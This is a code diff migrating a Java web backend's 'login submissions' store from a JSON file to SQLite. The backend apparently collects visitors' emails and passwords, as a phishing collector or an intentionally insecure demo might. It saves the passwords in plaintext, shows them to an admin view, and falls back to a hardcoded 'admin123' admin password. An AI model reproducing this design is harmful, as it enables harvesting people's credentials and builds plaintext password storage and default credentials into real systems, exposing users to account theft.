@@ -10,6 +10,12 @@ import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.security.SecureRandom;
+import java.sql.Connection;
+import java.sql.DriverManager;
+import java.sql.PreparedStatement;
+import java.sql.ResultSet;
+import java.sql.SQLException;
+import java.sql.Statement;
 import java.time.Instant;
 import java.util.ArrayList;
 import java.util.Collections;
@@ -26,12 +32,16 @@ public class JavaBackend {
     private static final Path ROOT = Path.of("").toAbsolutePath();
     private static final Path DATA_DIR = resolveDataDir();
     private static final Path SUBMISSIONS_FILE = DATA_DIR.resolve("submissions.json");
+    private static final Path DATABASE_FILE = DATA_DIR.resolve("submissions.db");
+    private static final String DATABASE_URL = "jdbc:sqlite:" + DATABASE_FILE;
     private static final String ADMIN_USERNAME = envOrDefault("ADMIN_USERNAME", "admin");
     private static final String ADMIN_PASSWORD = envOrDefault("ADMIN_PASSWORD", "admin123");
     private static final Set<String> SESSIONS = Collections.synchronizedSet(new HashSet<>());
     private static final SecureRandom RANDOM = new SecureRandom();
 
     public static void main(String[] args) throws IOException {
+        initializeDatabase();
+
         int port = Integer.parseInt(envOrDefault("PORT", "3000"));
         HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
         server.createContext("/api/login-submissions", JavaBackend::handleLoginSubmission);
@@ -66,16 +76,15 @@ public class JavaBackend {
             return;
         }
 
-        Map<String, String> submission = new HashMap<>();
-        submission.put("email", email);
-        submission.put("password", password);
-        submission.put("submittedAt", Instant.now().toString());
-        submission.put("userAgent", exchange.getRequestHeaders().getFirst("User-Agent") == null ? "" : exchange.getRequestHeaders().getFirst("User-Agent"));
+        String userAgent = exchange.getRequestHeaders().getFirst("User-Agent") == null ? "" : exchange.getRequestHeaders().getFirst("User-Agent");
 
-        List<Map<String, String>> submissions = readSubmissions();
-        submissions.add(submission);
-        writeSubmissions(submissions);
-        sendJson(exchange, 201, "{\"message\":\"Submission saved.\"}");
+        try {
+            saveSubmission(email, password, Instant.now().toString(), userAgent);
+            sendJson(exchange, 201, "{\"message\":\"Submission saved.\"}");
+        } catch (SQLException error) {
+            error.printStackTrace();
+            sendJson(exchange, 500, "{\"message\":\"Unable to save submission.\"}");
+        }
     }
 
     private static void handleAdminLogin(HttpExchange exchange) throws IOException {
@@ -117,18 +126,24 @@ public class JavaBackend {
             return;
         }
 
-        List<Map<String, String>> submissions = readSubmissions();
+        List<Map<String, String>> submissions;
+        try {
+            submissions = readSubmissions();
+        } catch (SQLException error) {
+            error.printStackTrace();
+            sendJson(exchange, 500, "{\"message\":\"Unable to load submissions.\"}");
+            return;
+        }
+
         StringBuilder json = new StringBuilder("{\"submissions\":[");
-        for (int i = submissions.size() - 1; i >= 0; i--) {
-            Map<String, String> submission = submissions.get(i);
-            int id = i + 1;
+        for (Map<String, String> submission : submissions) {
             if (json.charAt(json.length() - 1) != '[') {
                 json.append(',');
             }
                 String pw = submission.getOrDefault("password", "");
                 String pwStatus = !pw.isEmpty() ? "Stored as plaintext" : "Not stored";
             json.append('{')
-                    .append("\"id\":").append(id).append(',')
+                    .append("\"id\":").append(submission.getOrDefault("id", "0")).append(',')
                     .append("\"email\":\"").append(escapeJson(submission.getOrDefault("email", ""))).append("\",")
                     .append("\"submittedAt\":\"").append(escapeJson(submission.getOrDefault("submittedAt", ""))).append("\",")
                     .append("\"userAgent\":\"").append(escapeJson(submission.getOrDefault("userAgent", ""))).append("\",")
@@ -160,40 +175,93 @@ public class JavaBackend {
         }
     }
 
-    private static List<Map<String, String>> readSubmissions() throws IOException {
+    private static void initializeDatabase() throws IOException {
         Files.createDirectories(DATA_DIR);
-        if (!Files.exists(SUBMISSIONS_FILE)) {
-            return new ArrayList<>();
+        try {
+            Class.forName("org.sqlite.JDBC");
+            try (Connection connection = openDatabase();
+                 Statement statement = connection.createStatement()) {
+                statement.executeUpdate("""
+                        CREATE TABLE IF NOT EXISTS submissions (
+                            id INTEGER PRIMARY KEY AUTOINCREMENT,
+                            email TEXT NOT NULL,
+                            password TEXT NOT NULL,
+                            submitted_at TEXT NOT NULL,
+                            user_agent TEXT NOT NULL
+                        )
+                        """);
+            }
+            migrateJsonSubmissions();
+        } catch (ClassNotFoundException error) {
+            throw new IOException("SQLite JDBC driver is missing. Add sqlite-jdbc to the classpath.", error);
+        } catch (SQLException error) {
+            throw new IOException("Unable to initialize SQLite database.", error);
         }
+    }
 
-        String json = Files.readString(SUBMISSIONS_FILE);
+    private static Connection openDatabase() throws SQLException {
+        return DriverManager.getConnection(DATABASE_URL);
+    }
+
+    private static void saveSubmission(String email, String password, String submittedAt, String userAgent) throws SQLException {
+        String sql = "INSERT INTO submissions (email, password, submitted_at, user_agent) VALUES (?, ?, ?, ?)";
+        try (Connection connection = openDatabase();
+             PreparedStatement statement = connection.prepareStatement(sql)) {
+            statement.setString(1, email);
+            statement.setString(2, password);
+            statement.setString(3, submittedAt);
+            statement.setString(4, userAgent);
+            statement.executeUpdate();
+        }
+    }
+
+    private static List<Map<String, String>> readSubmissions() throws SQLException {
         List<Map<String, String>> submissions = new ArrayList<>();
-        Matcher objectMatcher = Pattern.compile("\\{([^{}]*)}").matcher(json);
-        while (objectMatcher.find()) {
-            Map<String, String> entry = parseJsonObject("{" + objectMatcher.group(1) + "}");
-            submissions.add(entry);
+        String sql = "SELECT id, email, password, submitted_at, user_agent FROM submissions ORDER BY id DESC";
+        try (Connection connection = openDatabase();
+             PreparedStatement statement = connection.prepareStatement(sql);
+             ResultSet result = statement.executeQuery()) {
+            while (result.next()) {
+                Map<String, String> entry = new HashMap<>();
+                entry.put("id", String.valueOf(result.getInt("id")));
+                entry.put("email", result.getString("email"));
+                entry.put("password", result.getString("password"));
+                entry.put("submittedAt", result.getString("submitted_at"));
+                entry.put("userAgent", result.getString("user_agent"));
+                submissions.add(entry);
+            }
         }
         return submissions;
     }
 
-    private static void writeSubmissions(List<Map<String, String>> submissions) throws IOException {
-        Files.createDirectories(DATA_DIR);
-        StringBuilder json = new StringBuilder("[\n");
-        for (int i = 0; i < submissions.size(); i++) {
-            Map<String, String> submission = submissions.get(i);
-                json.append("  {\n")
-                    .append("    \"email\": \"").append(escapeJson(submission.getOrDefault("email", ""))).append("\",\n")
-                    .append("    \"password\": \"").append(escapeJson(submission.getOrDefault("password", ""))).append("\",\n")
-                    .append("    \"submittedAt\": \"").append(escapeJson(submission.getOrDefault("submittedAt", ""))).append("\",\n")
-                    .append("    \"userAgent\": \"").append(escapeJson(submission.getOrDefault("userAgent", ""))).append("\"\n")
-                    .append("  }");
-            if (i < submissions.size() - 1) {
-                json.append(',');
-            }
-            json.append('\n');
+    private static void migrateJsonSubmissions() throws IOException, SQLException {
+        if (!Files.exists(SUBMISSIONS_FILE) || countSubmissions() > 0) {
+            return;
         }
-        json.append(']');
-        Files.writeString(SUBMISSIONS_FILE, json.toString());
+
+        String json = Files.readString(SUBMISSIONS_FILE);
+        Matcher objectMatcher = Pattern.compile("\\{([^{}]*)}").matcher(json);
+        while (objectMatcher.find()) {
+            Map<String, String> entry = parseJsonObject("{" + objectMatcher.group(1) + "}");
+            String email = entry.getOrDefault("email", "").trim();
+            String password = entry.getOrDefault("password", "");
+            if (!email.isEmpty() && !password.isEmpty()) {
+                saveSubmission(
+                        email,
+                        password,
+                        entry.getOrDefault("submittedAt", Instant.now().toString()),
+                        entry.getOrDefault("userAgent", "")
+                );
+            }
+        }
+    }
+
+    private static int countSubmissions() throws SQLException {
+        try (Connection connection = openDatabase();
+             PreparedStatement statement = connection.prepareStatement("SELECT COUNT(*) FROM submissions");
+             ResultSet result = statement.executeQuery()) {
+            return result.next() ? result.getInt(1) : 0;
+        }
     }
 
     private static Map<String, String> parseJsonObject(String json) {
